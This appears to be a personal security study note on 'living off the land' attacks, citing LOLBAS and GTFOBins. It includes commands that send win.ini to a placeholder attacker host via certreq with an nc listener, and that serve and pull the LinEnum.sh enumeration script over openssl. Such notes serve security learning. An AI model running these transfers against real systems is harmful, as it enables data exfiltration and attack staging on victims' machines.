---
title: Living off The Land
tags:
  - file_sharing
  - gtfobins
  - lolbas
created: 2025-02-27
---

# Living_off_The_Land

## Description
**"Living off the land"** refers to using pre-installed binaries and tools on a system to conduct malicious actions, minimizing the need for additional malware. This tactic is commonly used by attackers to evade detection.

## Repositories
- https://lolbas-project.github.io
- https://gtfobins.github.io/

## Use Cases
- File transfers (download/upload)
- Command execution
- Bypassing security controls
- Privilege escalation
- Persistence mechanisms
## Examples
### LOLBAS for win
#### Upload CertReq.exe
we can receive the win.ini file via `sudo nc -lvnp 8000` on attackers machine
```powershell
certreq -Post -config http://<attacker_ip>:8000/ c:\windows\win.ini
```
If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter.

### GTFOBins for linux
`OpenSSL` is frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."
#### Create cert in attack machine and stand up the server
```bash
# Create cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Stand up the server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

#### Download file from target machine
```bash
openssl s_client -connect <attacker_ip>:80 -quiet > LinEnum.sh
```


You can also check `Bitsadmin` and `Certutil`

